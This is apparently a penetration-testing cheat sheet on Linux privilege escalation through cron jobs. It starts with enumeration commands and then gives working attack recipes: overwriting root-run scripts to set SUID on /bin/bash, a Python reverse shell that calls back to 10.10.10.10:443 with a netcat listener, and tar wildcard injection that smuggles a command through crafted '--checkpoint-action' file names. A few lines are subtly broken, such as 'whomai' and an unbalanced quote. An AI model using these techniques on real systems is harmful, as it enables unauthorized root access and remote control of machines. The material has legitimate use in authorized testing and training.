# Cron jobs
Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server. They’re most commonly used for sysadmin jobs such as backups or cleaning /tmp/ directories and so on. The word Cron comes from crontab and it is present inside /etc directory.

## 🔍Enumeration 
Some importent Cron Jobs file to enumerate. Check if you have access with write permission on these files. Check inside the file, to find other paths with write permissions.
```
/etc/init.d                # → Contains initialization scripts used by System V-style init to manage services.
/etc/cron*                 # → Wildcard for all cron-related files and directories (cron jobs, config).
/etc/crontab               # → Main system-wide cron file for scheduled tasks.
/etc/cron.allow            # → Specifies users allowed to use the `cron` service.
/etc/cron.d                # → Directory for additional cron job definitions.
/etc/cron.deny             # → Specifies users *not* allowed to use `cron`.
/etc/cron.daily            # → Contains scripts scheduled to run daily.
/etc/cron.hourly           # → Contains scripts scheduled to run hourly.
/etc/cron.monthly          # → Contains scripts scheduled to run monthly.
/etc/cron.weekly           # → Contains scripts scheduled to run weekly.
/etc/sudoers               # → Defines sudo access rules for users and groups.
/etc/exports               # → Defines file systems available for remote mounting via NFS.
/etc/anacrontab            # → Config file for anacron to run cron jobs missed during system downtime.
/var/spool/cron            # → Contains user-specific cron jobs scheduled with `crontab`.
/var/spool/cron/crontabs/root  # → Contains the root user’s scheduled cron jobs.

crontab -l                 # → Lists the current user's cron jobs.
ls -alh /var/spool/cron    # → Lists all user cron job files with human-readable sizes.
ls -al /etc/ | grep cron   # → Filters and lists cron-related files/directories in `/etc`.
ls -al /etc/cron*          # → Lists contents and permissions of all cron-related folders/files.
cat /etc/cron*             # → Outputs the contents of all cron configuration files.
cat /etc/at.allow          # → Lists users allowed to use the `at` command for one-time tasks.
cat /etc/at.deny           # → Lists users *denied* from using `at`.
cat /etc/cron.allow        # → Lists users allowed to schedule cron jobs.
cat /etc/cron.deny*        # → Outputs contents of all deny lists for cron access.
```
You can use pspy to detect a CRON job.
- **pspy:** [https://github.com/DominicBreuker/pspy]
```
./pspy64 -pf -i 1000   # → print both commands and file system events and scan procfs every 1000 ms (=1sec)
```
## 📌Privilege Escalation via Nonexistent File Overwrite
```
cat /etc/crontab
Output Example: * * * * * root systemupdate.sh
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
Wait a while
/bin/bash -p
id && whoami
```

## 📌Privilege Escalation via Root Executable Bash Script
```
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/network-test.sh
echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
Wait a while
id && whomai
```

## 📌Privilege Escalation via Root Executable Python Script Overwrite
### 🎯Target:
```
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

// Replace the IP & Port 

// Save & Exit the Script
```
### 💀Attacker:
```
nc -lvnp 443
```
OR
### 🎯Target:
```
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import os

os.system("chmod +s /bin/bash")

// Save & Exit the Script

Wait a While
/bin/bash -p
id && whoami
```

## 📌Privilege Escalation via Tar Bash Script (WildCards)
```
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/mysql-db-backup.sh
cat /usr/bin/local/mysql-db-backup.sh
Output of Script:
--------------------------------
#!/bin/bash

cd /var/www/html/
tar czf /tmp/dbbackup.tar.gz *
--------------------------------
cd /var/www/html/
echo "#!/bin/bash" > priv.sh
echo "chmod +s /bin/bash" >> priv.sh
chmod +x priv.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
Wait a while
/bin/bash -p
id && whomai
```

## 📌Privilege Escalation via Tar Cron Job
```
cat /etc/crontab
Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
cd /var/www/html/
echo "chmod +s /bin/bash" > priv.sh
echo "" > "--checkpoint-action=exec=bash priv.sh
echo "" > --checkpoint=1
tar cf archive.tar *

// If it does not work , replace "bash" with "sh"
```
# 🔍Resources
- [https://github.com/gurkylee/Linux-Privilege-Escalation-Basics]
- [https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/]
